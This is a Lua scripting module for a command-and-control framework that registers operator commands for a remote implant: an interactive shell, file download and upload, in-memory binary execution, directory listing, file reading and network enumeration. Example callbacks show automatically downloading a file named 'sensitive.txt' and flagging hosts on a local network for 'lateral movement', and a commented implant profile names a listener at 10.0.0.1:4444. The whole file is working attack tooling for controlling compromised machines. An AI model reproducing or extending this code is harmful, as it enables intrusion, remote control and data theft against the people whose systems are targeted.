CODE = {
    PING = 1,
    SSH = 2,
    DOWN = 3,
    UPL = 4,
    KILL = 5,
    CD = 6,
    PWD = 7,
    LS = 8,
    MEMEXEC = 9,
    IFCONFIG = 10,
    CAT = 11
}

function ping(payload)
    lua_print("command ping from script args", payload, "\n")
    local task_id, err = add_task(CODE.PING, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
    
    -- Register a callback for this specific task
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
        lua_print("=== PING Response ===\n")
        lua_print("Task ID: " .. task_id.."\n")
        lua_print("Response: " .. response .. "\n")
        lua_print("From: " .. hostname .. " (" .. name .. ")\n")
        -- You can add automation logic here
    end)
end

function ssh(payload)
    local task_id, err = add_task(CODE.SSH, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function download(payload)
    local task_id, err = add_task(CODE.DOWN, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function upload(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        lua_print("Usage: upload <source_path> <dest_path>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.UPL, lcs[0], lcs[1])
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function upload2(payload)
    opts = {}
    -- = "s=/tmp/image.png d=Lua"
    for k, v in string.gmatch(payload, "(%w+)=([%w/.]+)") do
        opts[k] = v
    end

    if not opts.s or not opts.d then
        lua_print("Usage: upload2 s=<source_path> d=<dest_path>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.UPL, opts.s, opts.d)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function kill(payload)
    local task_id, err = add_task(CODE.KILL, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function pwd(payload)
    local task_id, err = add_task(CODE.PWD, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function cd(payload)
    local task_id, err = add_task(CODE.CD, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function ls(payload)
    local task_id, err = add_task(CODE.LS, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function memexec(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        lua_print("Usage: memexec <binary_path> <args>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function ifconfig(payload)
    local task_id, err = add_task(CODE.IFCONFIG, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function cat(payload)
    local task_id, err = add_task(CODE.CAT, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end


--[[
implant_register_profile("linux-beacon", {
    lhost    = "10.0.0.1:4444",
    os       = "linux",
    arch     = "amd64",
    uri      = "/beacon",
    output   = "beacon",
    template = "./template",
})
]]

--[[
The first argument of "command("impl","ping","Ping the implant", ping)" is the type of implant. Since the
C2 may be dealing with many times of implants that must be different (windows implant, linux, IoT), 
it is used for the C2 show commands that are handled by that type of implant (impl in this case).
So just command handled by the impl implant type will be shown to the used, when interacting
with a impl implant type.

The implant must presents itself's type
]]

-- type, name, desc, func
command("impl","ping","Ping the implant", ping)
command("impl","ssh","Get an interactive session", ssh)
command("impl","download","Download a file", download)
command("impl","upload","upload a file", upload)
command("impl","kill","Kill implant", kill)
command("impl","pwd","Get working dir", pwd)
command("impl","cd","Change dir", cd)
command("impl","ls","List dir", ls)
command("impl","memexec","Execute binary in memory", memexec)
command("impl","ifconfig","Display network interfaces", ifconfig)
command("impl","cat","Display file contents (first 10KB)", cat)

--[[
function OnRegister(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
end

function OnCheck(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("data:", args[5])
    print("task:", args[6])
end

function OnResponse(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("response:", args[5])
    print("task:", args[6])
end
]]

--[[ TASK-SPECIFIC CALLBACKS EXAMPLE

Task-specific callbacks allow you to register handlers for individual tasks,
enabling automation workflows. The callback is called when the task response
is received and is automatically removed after execution.

Example 1: Simple task callback
    local task_id = add_task(CODE.PWD, "")
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
        lua_print("Current directory: " .. response)
    end)

Example 2: Chain tasks based on response
    local task_id = add_task(CODE.LS, "/tmp")
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
        if string.match(response, "sensitive.txt") then
            lua_print("Found sensitive file, downloading...")
            add_task(CODE.DOWN, "/tmp/sensitive.txt")
        end
    end)

Example 3: Conditional automation
    local task_id = add_task(CODE.IFCONFIG, "")
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
        if string.match(response, "192.168") then
            lua_print(hostname .. " is on local network, proceeding with lateral movement")
            -- Add more tasks for lateral movement
        end
    end)

Callback parameters:
    - task_id: The unique task identifier
    - response: The task response data
    - name: Implant session name
    - uuid: Implant UUID
    - hostname: Target hostname  
    - user: Current user on target

Note: Task-specific callbacks take precedence over the global OnResponse callback.
      The callback is removed after execution (one-time use).

Thread-safe printing:
    Use lua_print() instead of print() in callbacks for thread-safe output.
    lua_print() uses the AsyncWriteStdout function from the log package.
]]

function Main()
end
